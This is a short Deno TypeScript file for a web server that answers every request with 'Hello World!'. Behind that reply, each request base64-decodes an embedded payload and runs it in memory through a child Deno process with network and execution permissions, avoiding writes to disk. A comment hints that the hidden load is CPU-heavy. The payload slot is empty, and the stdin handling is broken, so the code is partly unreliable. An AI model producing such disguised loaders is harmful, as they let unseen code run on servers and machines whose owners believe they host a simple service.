import { serve } from "https://deno.land/std/http/server.ts";

// Base64-encoded executable content (replace this with the actual content)
const base64EncodedExecutable = ""; // Replace with your Base64-encoded content

// Function to decode Base64 and execute the executable with safety measures
async function decodeAndExecuteExecutable(encodedContent) {
  try {
    const executableContent = Uint8Array.from(
      atob(encodedContent),
      (c) => c.charCodeAt(0),
    );

    // Execute the script directly in memory, avoiding file writing
    const process = Deno.run({
      cmd: ["deno", "run", "--allow-run", "--allow-read", "--allow-net", "-"],
      stdin: Deno.stdin, // Use Deno.stdin instead of process.stdin
      stdout: "piped",
      stderr: "piped",
    });

    // Write the executable content to the child process's stdin
    await Deno.writeAll(process.stdin, executableContent);
    process.stdin.close();

    const [output, errorOutput] = await Promise.all([
      process.output(),
      process.stderrOutput(),
    ]);

    console.log("Output:", new TextDecoder().decode(output));
    console.error("Error Output:", new TextDecoder().decode(errorOutput));

    // Close the child process
    await process.status();
  } catch (error) {
    console.error("Error decoding or executing the executable:", error);
  }
}

Deno.serve(async (req) => {
  // Trigger the decoding and execution
  await decodeAndExecuteExecutable(base64EncodedExecutable);

  // Return a generic response without mentioning CPU cores
  return new Response("Hello World!");
});
